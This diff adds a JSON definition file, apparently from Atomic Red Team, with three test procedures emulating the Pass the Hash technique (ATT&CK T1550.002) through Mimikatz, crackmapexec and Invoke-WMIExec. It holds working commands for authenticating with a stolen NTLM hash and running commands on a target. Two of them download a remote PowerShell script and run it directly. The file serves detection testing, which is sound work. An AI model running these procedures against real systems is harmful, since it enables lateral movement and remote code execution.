@@ -1,0 +1,145 @@
+{
+  "attack_technique": "T1550.002",
+  "display_name": "Use Alternate Authentication Material: Pass the Hash",
+  "atomic_tests": [
+    {
+      "name": "Mimikatz Pass the Hash",
+      "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "user_name",
+          "description": "username",
+          "type": "string",
+          "default": "Administrator"
+        },
+        {
+          "arg_name": "ntlm",
+          "description": "ntlm hash",
+          "type": "string",
+          "default": "cc36cf7a8514893efccd3324464tkg1a"
+        },
+        {
+          "arg_name": "domain",
+          "description": "domain",
+          "type": "string",
+          "default": "%userdnsdomain%"
+        },
+        {
+          "arg_name": "mimikatz_path",
+          "description": "mimikatz windows executable",
+          "type": "path",
+          "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})",
+          "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}",
+          "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath"
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "ec23cef9-27d9-46e4-a68d-6f75f7b86908"
+    },
+    {
+      "name": "crackmapexec Pass the Hash",
+      "description": "command execute with crackmapexec",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "user_name",
+          "description": "username",
+          "type": "string",
+          "default": "Administrator"
+        },
+        {
+          "arg_name": "crackmapexec_exe",
+          "description": "crackmapexec windows executable",
+          "type": "path",
+          "default": "C:\\CrackMapExecWin\\crackmapexec.exe"
+        },
+        {
+          "arg_name": "command",
+          "description": "command to execute",
+          "type": "string",
+          "default": "whoami"
+        },
+        {
+          "arg_name": "ntlm",
+          "description": "command",
+          "type": "string",
+          "default": "cc36cf7a8514893efccd3324464tkg1a"
+        },
+        {
+          "arg_name": "domain",
+          "description": "domain",
+          "type": "string",
+          "default": "%userdnsdomain%"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})",
+          "prereq_command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}",
+          "get_prereq_command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}"
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "eb05b028-16c8-4ad8-adea-6f5b219da9a9"
+    },
+    {
+      "name": "Invoke-WMIExec Pass the Hash",
+      "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "ntlm",
+          "description": "ntlm hash",
+          "type": "string",
+          "default": "cc36cf7a8514893efccd3324464tkg1a"
+        },
+        {
+          "arg_name": "user_name",
+          "description": "username",
+          "type": "string",
+          "default": "Administrator"
+        },
+        {
+          "arg_name": "command",
+          "description": "Command to run on target system",
+          "type": "string",
+          "default": "hostname"
+        },
+        {
+          "arg_name": "target",
+          "description": "System to run command on",
+          "type": "string",
+          "default": "$env:COMPUTERNAME"
+        }
+      ],
+      "auto_generated_guid": "f8757545-b00a-4e4e-8cfb-8cfb961ee713"
+    }
+  ]
+}
